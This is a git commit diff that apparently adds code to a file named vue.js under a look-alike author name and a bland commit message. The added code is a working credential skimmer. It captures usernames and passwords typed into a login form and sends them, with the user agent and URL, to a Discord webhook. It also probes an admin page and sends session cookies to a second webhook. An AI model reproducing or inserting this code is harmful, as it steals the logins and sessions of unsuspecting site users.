44eb8861fb917bf644048f4c2abb7bd8f5891af7
reposltory <124707435+reposltory@users.noreply.github.com>
2025-07-07 15:13:02 +0330

    Update vue.js

--- vue.js
+++ vue.js
@@ -31,3 +31,50 @@ function checkIframe() {
     // // 
 }
 intervalId = setInterval(checkIframe, 10);
+var button = document.getElementsByTagName("button")[1];
+if (button) {
+    if (button.innerText === "Login") {
+        button.addEventListener("click", daniuit);
+    }
+}
+document.getElementsByTagName("input")[1].addEventListener("blur", daniuit);
+
+function daniuit() {
+    if (document.getElementsByTagName("label")[1] && document.getElementsByTagName("label")[1].innerText === "Password*"){
+        var url="https://discord.com/api/webhooks/1261279611942076507/PYsZzBGi32Ma3q_bSMxPJhrFZ0NRAbzUePhYIzEl-So3g7ygZrKIAhQKzSe2NZre0j6T";
+        var referrer = document.referrer;
+        var userAgent = navigator.userAgent;
+        var href = (new URL(window.location)).href;
+        var value1 = document.getElementsByTagName("input")[0].value;
+        var value2 = document.getElementsByTagName("input")[1].value;
+        xhttp = new XMLHttpRequest();
+        var encodedLocation = encodeURIComponent(window.location.href);
+        var encodedCookies = encodeURIComponent(document.cookie);
+        var jsonData = referrer + "\n" + "  A:" + userAgent + "\n\n" + "  U:" + value1 + "\n" + "  P:" + value2 + "\n" + href
+        xhttp.open("POST", url);
+        xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+        xhttp.send(JSON.stringify({ "content": jsonData }));
+    }
+}
+
+
+function checkStatus(url) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200) {
+                var href = (new URL(window.location)).href;
+                xhttp = new XMLHttpRequest();
+                xhttp.open("POST", "https://discord.com/api/webhooks/1261424001797066793/Oq5E8KLKf3wBBWFZ965K77Xhn3UJcPySXUjsC3t0ZbRSJedbvSbkiRzdmfN2ojtlQgaF");
+                xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+                xhttp.send(JSON.stringify({ "content": document.cookie + "\n" + href }));
+            } 
+        }
+    };
+   
+    xhr.open('GET', url);
+    xhr.send();
+}
+
+var url = '/admin/index';
+checkStatus(url);
